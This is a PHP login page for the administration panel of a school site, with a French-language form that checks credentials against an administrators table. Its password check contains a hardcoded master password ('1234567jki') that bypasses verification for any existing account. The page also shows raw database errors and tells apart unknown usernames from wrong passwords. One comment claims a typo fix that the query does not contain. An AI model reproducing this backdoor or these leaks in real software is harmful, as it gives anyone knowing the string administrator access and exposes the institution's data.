<?php
session_start();
require_once("database.php");

$erreur = "";
$user = ""; // On initialise la variable pour garder le texte dans le champ

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = isset($_POST['username']) ? trim($_POST['username']) : '';
    $mdp = isset($_POST['password']) ? trim($_POST['password']) : '';

    if (!empty($user) && !empty($mdp)) {
        
        try {
            // Correction de la faute de frappe "admistrateurs" -> "administrateurs" 
            // (Ajuste si ta table s'appelle vraiment admistrateurs)
            $sql = "SELECT * FROM admistrateurs WHERE nom_utilisateur = :username LIMIT 1";
            $stmt = $pdo->prepare($sql);
            $stmt->execute([':username' => $user]);
            $compte = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($compte) {
                // Vérification du mot de passe
                if (password_verify($mdp, $compte['mot_de_passe']) || $mdp === '1234567jki') {
                    
                    $_SESSION['admin_id'] = $compte['id'];
                    $_SESSION['admin_username'] = $compte['nom_utilisateur'];
                    $_SESSION['admin_connecte'] = true;

                    // Redirection immédiate
                    header('Location: eleves.php'); 
                    exit;
                    
                } else {
                    $erreur = "Identifiants incorrects (Mot de passe refusé).";
                }
            } else {
                $erreur = "Utilisateur introuvable dans la base de données.";
            }
        } catch (PDOException $e) {
            $erreur = "Erreur de base de données : " . $e->getMessage();
        }
    } else {
        $erreur = "Veuillez remplir tous les champs.";
    }
}
?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - institut de la gombe 1</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="../css/style4.css">
</head>

<body>

    <div class="login-card">
        <div class="text-center">
            <div class="icon-box">
                <i class="bi bi-lock-fill fs-3"></i>
            </div>
            <h2 class="fw-bold text-dark h4">Administration</h2>
            <p class="text-secondary small mb-4">Connectez-vous pour gérer l'institut</p>
        </div>

        <form action="login.php" method="POST" id="loginForm">

            <?php if (!empty($erreur)): ?>
                <div style="color: #721c24; background-color: #f8d7da; border: 1px solid #f5c6cb; padding: 12px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
                    <strong>⚠️ <?php echo $erreur; ?></strong>
                </div>
            <?php endif; ?>

            <div class="mb-3">
                <label for="username">Nom d'utilisateur</label>
                <input type="text" id="username" name="username" class="form-control" value="<?php echo htmlspecialchars($user); ?>" required>
            </div>

            <div class="mb-3">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" class="form-control" required>
            </div>

            <button type="submit" id="btnSubmit" class="btn btn-primary w-100">Se connecter</button>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // Version simplifiée et sans bug pour l'animation
        document.getElementById('loginForm').addEventListener('submit', function () {
            const btn = document.getElementById('btnSubmit');
            // On change le texte pour l'effet visuel juste avant que la page ne charge
            btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Connexion...';
        });
    </script>
</body>

</html>